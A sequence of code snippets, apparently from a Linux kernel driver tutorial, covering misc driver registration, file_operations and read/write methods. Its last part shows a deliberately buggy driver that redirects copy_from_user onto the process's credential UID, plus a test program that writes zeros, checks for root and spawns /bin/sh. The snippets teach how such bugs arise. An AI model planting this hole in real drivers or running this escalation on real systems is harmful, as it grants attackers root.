["```\n$ mount | grep -w sysfs\nsysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\n```", "```\n$ ls -F /sys/\nblock/ bus/ class/ dev/ devices/ firmware/ fs/ hypervisor/ kernel/ module/ power/\n```", "```\n// ch1/miscdrv/miscdrv.c\n#define pr_fmt(fmt) \"%s:%s(): \" fmt, KBUILD_MODNAME, __func__\n[...]\n#include <linux/miscdevice.h>\n#include <linux/fs.h>              /* the fops, file data structures */\n[...]\n\nstatic struct miscdevice llkd_miscdev = {\n    .minor = MISC_DYNAMIC_MINOR, /* kernel dynamically assigns a free minor# */\n    .name = \"llkd_miscdrv\",      /* when misc_register() is invoked, the kernel\n             * will auto-create a device file as /dev/llkd_miscdrv ;\n             * also populated within /sys/class/misc/ and /sys/devices/virtual/misc/ */\n    .mode = 0666,            /* ... dev node perms set as specified here */\n    .fops = &llkd_misc_fops, /* connect to this driver's 'functionality' */\n};\n\nstatic int __init miscdrv_init(void)\n{\n    int ret;\n    struct device *dev;\n\n    ret = misc_register(&llkd_miscdev);\n    if (ret != 0) {\n        pr_notice(\"misc device registration failed, aborting\\n\");\n        return ret;\n    }\n    [ ... ]\n```", "```\n// include/linux/fs.h struct file_operations {\n    struct module *owner;\n    loff_t (*llseek) (struct file *, loff_t, int);\n    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);\n    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);\n[...]\n    __poll_t (*poll) (struct file *, struct poll_table_struct *);\n    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);\n    long (*compat_ioctl) (struct file *, unsigned int, unsigned long);\n    int (*mmap) (struct file *, struct vm_area_struct *);\n    unsigned long mmap_supported_flags;\n    int (*open) (struct inode *, struct file *);\n    int (*flush) (struct file *, fl_owner_t id); \n    int (*release) (struct inode *, struct file *);\n[...]\n    int (*fadvise)(struct file *, loff_t, loff_t, int);\n} __randomize_layout;\n```", "```\n   .fops = &llkd_misc_fops, /* connect to this driver's 'functionality' */\n```", "```\n/* pseudocode: kernel VFS layer (not the driver) */\nif (filp->f_op->foo)\n    filp->f_op->foo(); /* invoke the 'registered' driver method corresponding to 'foo()' */\n```", "```\nstatic const struct file_operations llkd_misc_fops = {\n    .open = open_miscdrv,\n    .read = read_miscdrv,\n    .write = write_miscdrv,\n    .release = close_miscdrv,\n};\n\nstatic struct miscdevice llkd_miscdev = {\n    [ ... ]\n    .fops = &llkd_misc_fops, /* connect to this driver's 'functionality' */\n};\n```", "```\n    [ ... ] \n    /* Retrieve the device pointer for this device */\n    dev = llkd_miscdev.this_device;\n    pr_info(\"LLKD misc driver (major # 10) registered, minor# = %d,\"\n            \" dev node is /dev/%s\\n\", llkd_miscdev.minor, llkd_miscdev.name);\n    dev_info(dev, \"sample dev_info(): minor# = %d\\n\", llkd_miscdev.minor);\n    return 0;        /* success */\n}\n```", "```\n/*\n * open_miscdrv()\n * The driver's open 'method'; this 'hook' will get invoked by the kernel VFS\n * when the device file is opened. Here, we simply print out some relevant info.\n * The POSIX standard requires open() to return the file descriptor on success;\n * note, though, that this is done within the kernel VFS (when we return). So,\n * all we do here is return 0 indicating success.\n * (The nonseekable_open(), in conjunction with the fop's llseek pointer set to\n * no_llseek, tells the kernel that our device is not seek-able).\n */\nstatic int open_miscdrv(struct inode *inode, struct file *filp)\n{\n    char *buf = kzalloc(PATH_MAX, GFP_KERNEL);\n\n    if (unlikely(!buf))\n        return -ENOMEM;\n    PRINT_CTX(); // displays process (or atomic) context info\n    pr_info(\" opening \\\"%s\\\" now; wrt open file: f_flags = 0x%x\\n\",\n        file_path(filp, buf, PATH_MAX), filp->f_flags);\n    kfree(buf);\n    return nonseekable_open(inode, filp);\n}\n```", "```\n/*\n * read_miscdrv()\n * The driver's read 'method'; it has effectively 'taken over' the read syscall\n * functionality! Here, we simply print out some info.\n * The POSIX standard requires that the read() and write() system calls return\n * the number of bytes read or written on success, 0 on EOF (for read) and -1 (-ve errno)\n * on failure; we simply return 'count', pretending that we 'always succeed'.\n */\nstatic ssize_t read_miscdrv(struct file *filp, char __user *ubuf, size_t count, loff_t *off)\n{\n        pr_info(\"to read %zd bytes\\n\", count);\n        return count;\n}\n```", "```\ndd if=/dev/llkd_miscdrv of=readtest bs=4k count=1\n```", "```\ninclude <linux/uaccess.h>   /* Note! used to be <asm/uaccess.h> upto 4.11 */\n\nunsigned long copy_to_user(void __user *to, const void *from, unsigned long n);\nunsigned long copy_from_user(void *to, const void __user *from, unsigned long n);\n```", "```\nstatic ssize_t read_method(struct file *filp, char __user *ubuf, size_t count, loff_t *off)\n{\n     char *kbuf = kzalloc(...);\n     [ ... ]\n     /* ... do what's required to get data from the hardware device into kbuf ... */\n    if (copy_to_user(buf, kbuf, count)) {\n        dev_warn(dev, \"copy_to_user() failed\\n\");\n        goto out_rd_fail;\n    }\n    [ ... ]\n    return count;    /* success */\nout_rd_fail:\n    kfree(kbuf);\n return -EIO; /* or -EFAULT */\n}\n```", "```\n// ch1/miscdrv_rdwr/miscdrv_rdwr.c\n[ ... ]\n/* The driver 'context' (or private) data structure;\n * all relevant 'state info' reg the driver is here. */\nstruct drv_ctx {\n    struct device *dev;\n    int tx, rx, err, myword;\n    u32 config1, config2;\n    u64 config3;\n#define MAXBYTES 128 /* Must match the userspace app; we should actually\n                      * use a common header file for things like this */\n    char oursecret[MAXBYTES];\n};\nstatic struct drv_ctx *ctx;\n```", "```\n// ch1/miscdrv_rdwr/\u200bmiscdrv_rdwr.c\n[ ... ]\nstatic int __init miscdrv_rdwr_init(void)\n{\n    int ret;\n    struct device *dev;\n\n    ret = misc_register(&llkd_miscdev);\n    [ ... ]\n    dev = llkd_miscdev.this_device;\n    [ ... ]\n    ctx = devm_kzalloc(dev, sizeof(struct drv_ctx), GFP_KERNEL);\n    if (unlikely(!ctx))\n        return -ENOMEM;\n\n    ctx->dev = dev;\n    strscpy(ctx->oursecret, \"initmsg\", 8);\n    [ ... ]\n    return 0;         /* success */\n}\n```", "```\nstatic ssize_t\nread_miscdrv_rdwr(struct file *filp, char __user *ubuf, size_t count, loff_t *off)\n{\n    int ret = count, secret_len = strlen(ctx->oursecret);\n    struct device *dev = ctx->dev;\n    char tasknm[TASK_COMM_LEN];\n\n    PRINT_CTX();\n    dev_info(dev, \"%s wants to read (upto) %zd bytes\\n\", get_task_comm(tasknm, current), count);\n\n    ret = -EINVAL;\n    if (count < MAXBYTES) {\n    [...] *<< we don't display some validity checks here >>*\n\n    /* In a 'real' driver, we would now actually read the content of the\n     * [...]\n     * Returns 0 on success, i.e., non-zero return implies an I/O fault).\n     * Here, we simply copy the content of our context structure's \n * 'secret' member to userspace. */\n    ret = -EFAULT;\n    if (copy_to_user(ubuf, ctx->oursecret, secret_len)) {\n        dev_warn(dev, \"copy_to_user() failed\\n\");\n        goto out_notok;\n    }\n    ret = secret_len;\n\n    // Update stats\n    ctx->tx += secret_len; // our 'transmit' is wrt this driver\n    dev_info(dev, \" %d bytes read, returning... (stats: tx=%d, rx=%d)\\n\",\n            secret_len, ctx->tx, ctx->rx);\nout_notok:\n    return ret;\n}\n```", "```\nstatic ssize_t\nwrite_miscdrv_rdwr(struct file *filp, const char __user *ubuf, size_t count, loff_t *off)\n{\n    int ret = count;\n    void *kbuf = NULL;\n    struct device *dev = ctx->dev;\n    char tasknm[TASK_COMM_LEN];\n\n    PRINT_CTX();\n    if (unlikely(count > MAXBYTES)) { /* paranoia */\n        dev_warn(dev, \"count %zu exceeds max # of bytes allowed, \"\n                \"aborting write\\n\", count);\n        goto out_nomem;\n    }\n    dev_info(dev, \"%s wants to write %zd bytes\\n\", get_task_comm(tasknm, current), count);\n\n    ret = -ENOMEM;\n    kbuf = kvmalloc(count, GFP_KERNEL);\n    if (unlikely(!kbuf))\n        goto out_nomem;\n    memset(kbuf, 0, count);\n\n    /* Copy in the user supplied buffer 'ubuf' - the data content\n     * to write ... */\n    ret = -EFAULT;\n    if (copy_from_user(kbuf, ubuf, count)) {\n        dev_warn(dev, \"copy_from_user() failed\\n\");\n        goto out_cfu;\n     }\n\n    /* In a 'real' driver, we would now actually write (for 'count' bytes)\n     * the content of the 'ubuf' buffer to the device hardware (or \n     * whatever), and then return.\n     * Here, we do nothing, we just pretend we've done everything :-)\n     */\n    strscpy(ctx->oursecret, kbuf, (count > MAXBYTES ? MAXBYTES : count));\n    [...]\n    // Update stats\n    ctx->rx += count; // our 'receive' is wrt this driver\n\n    ret = count;\n    dev_info(dev, \" %zd bytes written, returning... (stats: tx=%d, rx=%d)\\n\",\n            count, ctx->tx, ctx->rx);\nout_cfu:\n    kvfree(kbuf);\nout_nomem:\n    return ret;\n}\n```", "```\nstatic void __exit miscdrv_rdwr_exit(void)\n{\n    misc_deregister(&llkd_miscdev);\n    pr_info(\"LLKD misc (rdwr) driver deregistered, bye\\n\");\n}\n```", "```\n// ch1/miscdrv_rdwr/rdwr_test_secret.c\nint main(int argc, char **argv)\n{\n    char opt = 'r';\n    int fd, flags = O_RDONLY;\n    ssize_t n;\n    char *buf = NULL;\n    size_t num = 0;\n[...]\n    if ('w' == opt)\n        flags = O_WRONLY;\n    fd = open(argv[2], flags, 0); if (fd== -1) {\n    [...]\n```", "```\n    if ('w' == opt)\n        num = strlen(argv[3])+1;    // IMP! +1 to include the NULL byte!\n    else\n        num = MAXBYTES;\n    buf = malloc(num);\n    if (!buf) {\n        [...]\n```", "```\n    if ('r' == opt) {\n        n = read(fd, buf, num);\n        if( n < 0 ) [...]\n        printf(\"%s: read %zd bytes from %s\\n\", argv[0], n, argv[2]);\n        printf(\"The 'secret' is:\\n \\\"%.*s\\\"\\n\", (int)n, buf);\n    } else {\n        strncpy(buf, argv[3], num);\n        n = write(fd, buf, num);\n        if( n < 0 ) [ ... ]\n        printf(\"%s: wrote %zd bytes to %s\\n\", argv[0], n, argv[2]);\n    }\n    [...]\n    free(buf);\n    close(fd);\n    exit(EXIT_SUCCESS); \n} \n```", "```\n// in ch1/bad_miscdrv\n$ diff -u ../miscdrv_rdwr/miscdrv_rdwr.c bad_miscdrv.c\n[ ... ]\n+#include <linux/cred.h>            \u200b// access to struct cred\n#include \"../../convenient.h\"\n[ ... ]\nstatic ssize_t read_miscdrv_rdwr(struct file *filp, char __user *ubuf,\n[ ... ]\n+ void *kbuf = NULL;\n+ void *new_dest = NULL;\n[ ... ]\n+#define READ_BUG\n+//#undef READ_BUG\n+#ifdef READ_BUG\n[ ... ]\n+ new_dest = ubuf+(512*1024);\n+#else\n+ new_dest = ubuf;\n+#endif\n[ ... ]\n+ if (copy_to_user(new_dest, ctx->oursecret, secret_len)) {\n[ ... ]\n```", "```\n// in ch1/bad_miscdrv\n$ diff -u ../miscdrv/rdwr_test.c rdwr_test_hackit.c\n[ ... ]\n+#define HACKIT\n[ ... ]\n+#ifndef HACKIT\n+     strncpy(buf, argv[3], num);\n+#else\n+     printf(\"%s: attempting to get root ...\\n\", argv[0]);\n+     /*\n+      * Write only 0's ... our 'bad' driver will write this into\n+      * this process's current->cred->uid member, thus making us\n+      * root !\n+      */\n+     memset(buf, 0, num);\n #endif\n- } else { // test writing ..\n          n = write(fd, buf, num);\n[ ... ]\n+     printf(\"%s: wrote %zd bytes to %s\\n\", argv[0], n, argv[2]);\n+#ifdef HACKIT\n+     if (getuid() == 0) {\n+         printf(\" !Pwned! uid==%d\\n\", getuid());\n+         /* the hacker's holy grail: spawn a root shell */\n+         execl(\"/bin/sh\", \"sh\", (char *)NULL);\n+     }\n+#endif\n[ ... ]\n```", "```\n// in ch1/bad_miscdrv\n$ diff -u ../miscdrv_rdwr/miscdrv_rdwr.c bad_miscdrv.c\n[...]           \n         // << this is within the driver's write method >>\n static ssize_t write_miscdrv_rdwr(struct file *filp, const char __user *ubuf,\n size_t count, loff_t *off)\n {\n        int ret = count;\n        struct device *dev = ctx->dev;\n+       void *new_dest = NULL;\n[ ... ]\n+#define DANGER_GETROOT_BUG\n+//#undef DANGER_GETROOT_BUG\n+#ifdef DANGER_GETROOT_BUG\n+     /* Make the destination of the copy_from_user() point to the current\n+      * process context's (real) UID; this way, we redirect the driver to\n+      * write zero's here. Why? Simple: traditionally, a UID == 0 is what\n+      * defines root capability!\n+      */\n+      new_dest = &current->cred->uid; +      count = 4; /* change count as we're only updating a 32-bit quantity */\n+      pr_info(\" [current->cred=%px]\\n\", (TYPECST)current->cred);\n+#else\n+      new_dest = kbuf;\n+#endif\n```", "```\nLinux-Kernel-Programming-Part-2/ch1/bad_miscdrv/bad_miscdrv.c:229:11: warning: assignment discards \u2018const\u2019 qualifier from pointer target type [-Wdiscarded-qualifiers]\n 229 | new_dest = &current->cred->uid;\n |          ^\n```", "```\n[...]\n+       dev_info(dev, \"dest addr = \" ADDRFMT \"\\n\", (TYPECST)new_dest);\n        ret = -EFAULT;\n-       if (copy_from_user(kbuf, ubuf, count)) {\n+       if (copy_from_user(new_dest, ubuf, count)) {\n                dev_warn(dev, \"copy_from_user() failed\\n\");\n                goto out_cfu;\n        }\n[...]\n```", "```\n$ dmesg \n[ 63.847549] bad_miscdrv:bad_miscdrv_init(): LLKD 'bad' misc driver (major # 10) registered, minor# = 56\n[ 63.848452] misc bad_miscdrv: A sample print via the dev_dbg(): (bad) driver initialized\n[ 84.186882] bad_miscdrv:open_miscdrv_rdwr(): 000) rdwr_test_hacki :2765 | ...0 /* open_miscdrv_rdwr() */\n[ 84.190521] misc bad_miscdrv: opening \"bad_miscdrv\" now; wrt open file: f_flags = 0x8001\n[ 84.191557] bad_miscdrv:write_miscdrv_rdwr(): 000) rdwr_test_hacki :2765 | ...0 /* write_miscdrv_rdwr() */\n[ 84.192358] misc bad_miscdrv: rdwr_test_hacki wants to write 4 bytes to (original) ubuf = 0x55648b8f36b0\n[ 84.192971] misc bad_miscdrv: [current->cred=ffff9f67765c3b40]\n[ 84.193392] misc bad_miscdrv: dest addr = ffff9f67765c3b44 count=4\n[ 84.193803] misc bad_miscdrv: 4 bytes written, returning... (stats: tx=0, rx=4)\n[ 89.002675] bad_miscdrv:close_miscdrv_rdwr(): 000) [sh]:2765 | ...0 /* close_miscdrv_rdwr() */\n[ 89.005992] misc bad_miscdrv: filename: \"bad_miscdrv\"\n$ \n```"]